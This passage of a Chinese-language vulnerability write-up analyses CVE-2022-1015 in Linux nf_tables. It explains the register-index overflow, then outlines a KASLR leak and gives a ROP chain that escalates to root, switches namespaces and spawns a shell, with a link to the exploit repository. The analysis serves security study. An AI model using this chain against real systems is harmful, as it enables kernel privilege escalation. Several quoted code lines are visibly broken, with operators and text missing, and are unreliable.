        __u32        nlmsg_len;    /* Length of message including header */
        __u16        nlmsg_type;    /* Message content */
        __u16        nlmsg_flags;    /* Additional flags */
        __u32        nlmsg_seq;    /* Sequence number */
        __u32        nlmsg_pid;    /* Sending process port ID */
    };
struct nlmsghdr 之后通常紧跟特定 protocol 定义的协议头部，不同 protocal 的协议头部差异很大。
协议头部之后是多个属性，属性的头部是以下结构：
    struct nlattr {
        __u16           nla_len;
        __u16           nla_type;
    };
属性的实际内容则紧跟在头部之后。
## 三、漏洞成因
漏洞类型是整形溢出导致的栈溢出，同时存在于 nft_validate_register_store 及 nft_validate_register_load
两个函数，以下仅通过 nft_validate_register_load 进行解释，nft_validate_register_store
处的情况大同小异。
    /* net/netfilter/nf_tables_api.c */
    int nft_validate_register_load(enum nft_registers reg, unsigned int len)
    {
        // 这里检查是否在读取 verdict register， 这是不被允许的
        if (reg  sizeof_field(struct nft_regs, data))
            return -ERANGE;
        return 0;
    }
由于 reg 的范围没有限制好，导致 reg * NFT_REG32_SIZE + len 整形溢出。
reg 的取值范围分析可以看 nft_validate_register_load 的调用处：
    /* net/netfilter/nf_tables_api.c */
    int nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len)
    {
        u32 reg; // 4 byte register variable
        int err;
        reg = nft_parse_register(attr); // gets the register index from an attribute
        err = nft_validate_register_load(reg, len); // calls the validating function
        if (err  the register from which we read
        return 0;
    }
    EXPORT_SYMBOL_GPL(nft_parse_register_load);
可以看到 reg 来自 netlink 属性 attr，通过 nft_parse_register 函数解析出来，再传递给
nft_validate_register_load 函数。
    /* net/netfilter/nf_tables_api.c */
    /**
     *    nft_parse_register - parse a register value from a netlink attribute
     *
     *    @attr: netlink attribute
     *
     *    Parse and translate a register value from a netlink attribute.
     *    Registers used to be 128 bit wide, these register numbers will be
     *    mapped to the corresponding 32 bit register numbers.
     */
    static unsigned int nft_parse_register(const struct nlattr *attr)
    {
        unsigned int reg;
        // from include/uapi/linux/netfilter/nf_tables.h
        // NFT_REG_SIZE = 16 (16 bytes)
        // NFT_REG32_SIZE = 4 (4 bytes)
        reg = ntohl(nla_get_be32(attr));
        switch (reg) {
        case NFT_REG_VERDICT...NFT_REG_4:
            return reg * NFT_REG_SIZE / NFT_REG32_SIZE; 
        default:
            return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;
        }
    }
在 nft_parse_register 中，明显没有对 reg 范围做任何限制，传入在 NFT_REG_VERDICT…NFT_REG_4
之外的值，函数最终都会返回 reg + NFT_REG_SIZE / NFT_REG32_SIZE – NFT_REG32_00，也就是 reg – 4。
最终，nft_parse_register_load 传回的 reg 会作为 index 用于访问 nft_do_chain 函数中的 nft_regs
局部变量，导致栈溢出。由于 nft_validate_register_store 及 nft_validate_register_load
两个函数都存在漏洞，因此可以同时越界读和写 nft_regs 之后的栈内存。
## 四、EXP思路
EXP 中存在大量的算术运算计算各种地址位移，所针对的是特定的漏洞及特定的内核映像，在此谈论这些意义不大，因此本文只谈通用的思路。想要更细致研究的话可以参考
EXP 仓库：
通常，由于 canary 的存在，memcpy 等函数引发的栈内存越界写会难以利用，因为 memcpy
的起始地址通常是某个局部变量，要覆写到返回地址则必定会覆写 canary。这个漏洞可以利用的原因就是越界读写的起始地址可以通过传入的 reg
值设定，因此可以越过 canary，从 canary 之后、返回地址之前的地址开始覆写。
###  4.1 泄露内核地址
首先通过动态调试寻找栈上的内核地址，再通过 nft_bitwise 这一 expression 越界读取该范围的内存，保存进 nft_regs
的正常范围内存内，这样才能通过 nft_payload_set 将 nft_regs 正常范围内存的内容复制到数据包中，经由用户态的 socket
接收该数据包获取到内核地址，以绕过 KASLR 保护。
###  4.2 代码执行
通过 nft_payload 将通过数据包发送的 ROP 链复制到 nft_regs 的正常范围内存内，再通过 nft_bitwise
越界写以覆盖到返回地址。为了不覆写到 canary，起始地址必须限制在 canary 之后，返回地址之前。
ROP 链的构造如下：
    int offset = 0;
    // clearing interrupts
    payload[offset++] = kbase + cli_ret;
    // preparing credentials
    payload[offset++] = kbase + pop_rdi_ret; 
    payload[offset++] = 0x0; // first argument of prepare_kernel_cred
    payload[offset++] = kbase + prepare_kernel_cred;
    // commiting credentials
    payload[offset++] = kbase + mov_rdi_rax_ret;
    payload[offset++] = kbase + commit_creds;
    // switching namespaces
    payload[offset++] = kbase + pop_rdi_ret;
    payload[offset++] = process_id;
    payload[offset++] = kbase + find_task_by_vpid;
    payload[offset++] = kbase + mov_rdi_rax_ret;
    payload[offset++]    = kbase + pop_rsi_ret;
    payload[offset++] = kbase + ini;
    payload[offset++] = kbase + switch_task_namespaces;
    // returning to userland
    payload[offset++] = kbase + swapgs_restore_regs_and_return_to_usermode;
    payload[offset++] = (unsigned long)spawnShell;
    payload[offset++] = user_cs;
    payload[offset++] = user_rflags;
    payload[offset++] = user_sp;
    payload[offset++] = user_ss;
先清空 interrupt 标志位，屏蔽可屏蔽中断，防止 ROP 被打断。
之后通过调用 prepare_kernel_cred(0) 准备权限为 root 的进程 cred。prepare_kernel_cred
是内核中专门用来准备进程 cred 的，进程 cred 代表了进程的各种权限。当对 prepare_kernel_cred 传入的参数为 0 时，返回的就是
root 权限的进程 cred。
再通过调用 switch_task_namespaces(find_task_by_vpid(process_id), &init_nsproxy) 将
EXP 进程的名称空间切换到 init_nsproxy。其中 process_id 为 EXP 进程的
pid，有许多办法可在用户态获取并保存下来，find_task_by_vpid 则会返回指定 pid 的 task_struct，init_nsproxy
为 init 进程也就是第一个进程的名称空间。由于使用 nf_tables 需要切换到新的 user + network
名称空间，所以这一步是必要的。当然，也可以在获得 root 权限后返回到用户态时再切换。
最后是返回到用户态，通过 swapgs; iret; 这一 gadget。需要在栈上依次准备好 IP、CS、EFLAGS、SP、SS
寄存器的内容，其中，IP 指向可弹出一个 shell 的函数，该函数通过调用 system(“/bin/sh”) 获得 shell。
###  4.3 离开 softirq 上下文
在漏洞发现者的 [EXP](https://github.com/pqlx/CVE-2022-1015) 中，在上一节的清空 interrupt
标志位操作后，还增加了一步离开 softirq 上下文的操作，这是因为在 EXP 作者的利用环境中，nft_do_chain 在
NET_RX_SOFTIRQ 类型 irqsoft 上下文中被调用。这一步不是必须的，但不执行这一步会让系统变得不稳定。
进入 softirq 的逻辑实现在 do_softirq 函数中：
    /*
     * Macro to invoke __do_softirq on the irq stack. This is only called from
     * task context when bottom halves are about to be reenabled and soft
     * interrupts are pending to be processed. The interrupt stack cannot be in
     * use here.
     */
    #define do_softirq_own_stack()                        \
    {                                    \
        __this_cpu_write(hardirq_stack_inuse, true);            \
        call_on_irqstack(__do_softirq, ASM_CALL_ARG0);            \
        __this_cpu_write(hardirq_stack_inuse, false);            \
    }
    ---    
    asmlinkage __visible void do_softirq(void)
    {
        __u32 pending;
        unsigned long flags;
        if (in_interrupt())
            return;
        local_irq_save(flags);
        pending = local_softirq_pending();
        if (pending && !ksoftirqd_running(pending))
            do_softirq_own_stack();
        local_irq_restore(flags);
    }
    asmlinkage __visible void __softirq_entry __do_softirq(void)
    {
        unsigned long end = jiffies + MAX_SOFTIRQ_TIME;
        unsigned long old_flags = current->flags;
        int max_restart = MAX_SOFTIRQ_RESTART;
        struct softirq_action *h;
        bool in_hardirq;
        __u32 pending;
        int softirq_bit;
        /*
         * Mask out PF_MEMALLOC as the current task context is borrowed for the
         * softirq. A softirq handled, such as network RX, might set PF_MEMALLOC
         * again if the socket is related to swapping.
         */
        current->flags &= ~PF_MEMALLOC;
        pending = local_softirq_pending();
        softirq_handle_begin();
        in_hardirq = lockdep_softirq_start();
        account_softirq_enter(current);
        restart:
        /* Reset the pending bitmask before enabling irqs */
        set_softirq_pending(0);
        local_irq_enable();
        h = softirq_vec;
        while ((softirq_bit = ffs(pending))) {
            unsigned int vec_nr;
            int prev_count;
            h += softirq_bit - 1;
            vec_nr = h - softirq_vec;
            prev_count = preempt_count();
            kstat_incr_softirqs_this_cpu(vec_nr);
            trace_softirq_entry(vec_nr);
            h->action(h); // action,
                        prev_count, preempt_count());
                preempt_count_set(prev_count);
            }
            h++;
            pending >>= softirq_bit;
        }
        if (!IS_ENABLED(CONFIG_PREEMPT_RT) &&
            __this_cpu_read(ksoftirqd) == current)
            rcu_softirq_qs();
        local_irq_disable();
        pending = local_softirq_pending();
        if (pending) {
            if (time_before(jiffies, end) && !need_resched() &&
                --max_restart)
                goto restart;
            wakeup_softirqd();
        }
        account_softirq_exit(current);
        lockdep_softirq_end(in_hardirq);
        softirq_handle_end();
        current_restore_flags(old_flags, PF_MEMALLOC);
    }
在 soft_irq 处理完毕后，通过 local_irq_disable() 关中断，再通过 softirq_handle_end() 调整
preempt_count，原来的系统调用栈在 do_softirq 函数中通过调用 do_softirq_own_stack 宏恢复，最后重新打开中断。
由于 softirq _handle_end() 被内联在 \_ _do _softirq()
中，在此[EXP](https://github.com/pqlx/CVE-2022-1015) 中，作者仅通过 ROP 将控制流引导至
\__do_softirq() 调用 softirq_handle_end() 处，调整了 preempt_count，并称可以无副作用地离开
softirq 的上下文，回到进程上下文。
## 参考
[How The Tables Have Turned: An analysis of two new Linux vulnerabilities in
nf_tables](https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/)
[CVE-2022-1015: A validation flaw in Netfilter leading to Local Privilege
Escalation](https://ysanatomic.github.io/cve-2022-1015/)
[Dissecting the Linux Firewall: Introduction to Netfilter’s
nf_tables](https://ysanatomic.github.io/netfilter_nf_tables/)
[A Deep Dive into Iptables and Netfilter
Architecture](https://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture)
[Connection Tracking (conntrack): Design and Implementation Inside Linux
Kernel](https://arthurchiao.art/blog/conntrack-design-and-implementation/)
[Introduction to Netlink — The Linux Kernel
documentation](https://www.kernel.org/doc/html/latest/userspace-api/netlink/intro.html)
[netlink(7) – Linux manual page](https://man7.org/linux/man-pages/man7/netlink.7.html)
[Portal:DeveloperDocs/nftables internals – nftables
wiki](https://wiki.nftables.org/wiki-nftables/index.php/Portal:DeveloperDocs/nftables_internals)